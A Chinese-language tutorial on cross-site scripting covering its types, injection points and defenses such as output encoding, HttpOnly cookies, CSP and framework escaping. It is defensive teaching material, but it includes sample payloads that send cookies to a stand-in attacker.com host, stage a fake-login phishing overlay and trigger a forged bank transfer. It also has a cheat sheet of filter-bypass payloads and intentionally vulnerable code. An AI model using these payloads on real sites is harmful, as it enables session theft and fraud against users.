# ✅XSS攻击的原理、分类和防御措施

# 典型回答

**XSS（Cross-Site Scripting，跨站脚本攻击）** 是一种代码注入攻击。攻击者将恶意脚本注入到网页中，当用户浏览该页面时，恶意脚本在用户浏览器中执行，从而窃取用户信息、劫持会话、篡改页面内容等。

**攻击原理：** 应用程序将用户输入的数据直接输出到 HTML 页面中，且未经过充分的过滤或转义，导致恶意脚本代码被浏览器执行。

**三类 XSS 攻击：**

1. **反射型 XSS（Reflected XSS）**：恶意脚本存在于 URL 参数中，服务器将参数内容直接返回给页面执行。攻击者通常通过诱导用户点击精心构造的恶意链接来进行攻击。
2. **存储型 XSS（Stored XSS）**：恶意脚本被存储到服务器数据库（如评论、用户资料、博客文章），当其他用户访问相关页面时，脚本从服务器加载并执行。危害最大。
3. **DOM 型 XSS（DOM-based XSS）**：恶意脚本不经过服务器，完全在客户端通过 JavaScript 操作 DOM 时执行。攻击源于前端代码不安全地处理用户输入。

**防御措施：** 输入过滤和验证、输出编码转义、设置合适的 HTTP 安全头（CSP、X-XSS-Protection）、使用 HttpOnly Cookie。

# 扩展知识

### 反射型 XSS 详解

```html
<!-- 场景：搜索页面将关键词原样回显 -->
<!-- URL: https://example.com/search?q=<script>alert('xss')</script> -->

<!-- 存在漏洞的代码 -->
<p>您搜索的关键词：<?php echo $_GET['q']; ?></p>

<!-- 恶意构造 -->
<!-- https://example.com/search?q=<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)"> -->

<!-- 攻击过程 -->
1. 攻击者构造恶意链接
2. 通过邮件、社交平台诱骗用户点击
3. 用户浏览器执行恶意脚本
4. 恶意脚本窃取用户 Cookie 发送到攻击者服务器
```

### 存储型 XSS 详解

```html
<!-- 场景：评论区显示用户提交的内容 -->
<!-- 存在漏洞的代码 -->
<div class="comment">
  <%= comment.content %>   <!-- 直接输出未转义 -->
</div>

<!-- 攻击者提交评论 -->
<script>
  // 1. 窃取 Cookie
  fetch('https://attacker.com/log?cookie=' + document.cookie);
  
  // 2. 篡改页面内容（钓鱼）
  document.body.innerHTML = '<div style="...">请重新登录</div>';
  
  // 3. 执行恶意操作
  fetch('https://bank.com/transfer?to=attacker&amount=10000', {
    credentials: 'include'
  });
</script>

<!-- 攻击过程 -->
1. 攻击者在评论区提交恶意脚本
2. 服务器将脚本存储到数据库
3. 所有访问该页面的用户都会加载并执行恶意脚本
4. 存储型 XSS 影响范围最广，危害最大
```

### DOM 型 XSS 详解

```javascript
// 存在漏洞的前端代码
// URL: https://example.com/welcome.html?name=<script>alert('xss')</script>

// ❌ 不安全的做法
const params = new URLSearchParams(window.location.search);
const name = params.get('name');
document.getElementById('welcome').innerHTML = '欢迎您: ' + name;
// 直接将用户输入通过 innerHTML 插入 DOM

// ❌ 其他不安全的方法
document.write(name);                    // 危险
element.outerHTML = name;                // 危险
element.insertAdjacentHTML('beforeend', name); // 危险
eval(name);                              // 极其危险
setTimeout(name, 0);                     // 危险
new Function(name);                      // 危险

// ✅ 安全的做法
document.getElementById('welcome').textContent = '欢迎您: ' + name;
// 使用 textContent 替代 innerHTML
```

### XSS 攻击的常见注入点

| 上下文 | 注入方式 | 示例 |
|--------|---------|------|
| HTML 标签内容 | 插入 `<script>` 或其他标签 | `<div>${userInput}</div>` |
| HTML 属性值 | 闭合属性后注入 | `<img src="${userInput}">` |
| JavaScript 字符串 | 闭合字符串后执行代码 | `var msg = '${userInput}';` |
| CSS 样式 | 注入 `expression()` 或 `url()` | `{ background: url(${input}) }` |
| URL 参数 | 注入 `javascript:` 伪协议 | `<a href="${userInput}">` |
| JSONP 回调 | 修改回调函数名 | `callback=${userInput}` |

### 主要防御措施

```javascript
// 1. 输出编码/转义（最重要）
// HTML 实体编码
function escapeHtml(str) {
  const div = document.createElement('div');
  div.appendChild(document.createTextNode(str));
  return div.innerHTML;
}

// 更全面的编码
function encodeForHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}

// JavaScript 字符串编码
function encodeForJS(str) {
  return str
    .replace(/\\/g, '\\\\')
    .replace(/"/g, '\\"')
    .replace(/'/g, "\\'")
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/</g, '\\x3C')
    .replace(/>/g, '\\x3E');
}

// 2. 使用 HttpOnly Cookie（防御 Cookie 窃取）
// 服务端设置
res.cookie('sessionId', 'abc123', {
  httpOnly: true,  // JS 无法读取此 Cookie
  secure: true,
  sameSite: 'lax'
});

// 3. 输入验证
function sanitizeInput(input) {
  // 白名单策略：只允许安全的字符
  return input.replace(/[^\w\s一-龥.,!?]/g, '');
}

// 4. 使用安全的 API
// ✅ 安全
element.textContent = userInput;
element.setAttribute('title', userInput);

// ❌ 危险
element.innerHTML = userInput;
element.outerHTML = userInput;
```

### 三大前端框架对 XSS 的防护

| 框架 | 默认转义 | 说明 |
|------|---------|------|
| React | 是 | JSX 默认对所有内容做 HTML 转义。`dangerouslySetInnerHTML` 需显式使用 |
| Vue | 是 | 模板中所有插值 `{{ }}` 默认转义。`v-html` 需显式使用 |
| Angular | 是 | 默认对所有插值做消毒（Sanitization）。`DomSanitizer` 需显式绕过 |

```jsx
// React 示例
function Comment({ content }) {
  // ✅ 安全：React 自动转义
  return <div>{content}</div>;
  
  // ❌ 危险：跳过 React 的转义机制
  // return <div dangerouslySetInnerHTML={{ __html: content }} />;
}
```

```vue
<!-- Vue 示例 -->
<template>
  <!-- ✅ 安全：Vue 自动转义 -->
  <div>{{ userInput }}</div>
  
  <!-- ❌ 危险：v-html 会原样输出 HTML -->
  <div v-html="userInput"></div>
</template>
```

### Content Security Policy（CSP）配置

```html
<!-- 通过 HTTP 头或 meta 标签配置 CSP -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'nonce-abc123' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' https: data:;
  connect-src 'self' https://api.example.com;
  frame-src 'none';
  object-src 'none';
">

<!-- 使用 nonce 的白名单脚本 -->
<script nonce="abc123">
  // 只有带有正确 nonce 的脚本才能执行
</script>
```

### XSS 攻击载荷示例

```
<!-- 基本的脚本注入 -->
<script>alert('XSS')</script>

<!-- 无 script 标签的注入 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>

<!-- 利用事件处理器 -->
<a href="javascript:alert(1)">Click me</a>
<iframe src="javascript:alert(1)">

<!-- 利用 CSS 表达式（旧 IE） -->
<div style="background:url('javascript:alert(1)')">

<!-- 绕过过滤的技巧 -->
<SCRiPT>alert(1)</SCRIPT>          <!-- 大小写绕过 -->
<script>eval(atob('YWxlcnQoMSk='))</script>  <!-- Base64 编码 -->
<scr<script>ipt>alert(1)</scr>     <!-- 嵌套绕过 -->
```

### XSS 安全防护清单

| 措施 | 优先级 | 说明 |
|------|--------|------|
| 输出编码 | 必须 | 根据上下文选择合适的编码方式（HTML/JS/CSS/URL） |
| 输入验证 | 推荐 | 验证数据格式和类型，拒绝非法输入 |
| CSP 策略 | 推荐 | 限制脚本执行源，降低 XSS 危害 |
| HttpOnly Cookie | 推荐 | 防止会话 Cookie 被脚本窃取 |
| 使用安全的DOM API | 推荐 | 优先使用 textContent，避免 innerHTML |
| 前端框架的安全机制 | 推荐 | 不要轻易禁用框架的转义机制 |
| XSS 扫描工具 | 可选 | 使用自动化工具检测漏洞 |
| 安全培训 | 可选 | 提高开发人员的安全意识 |
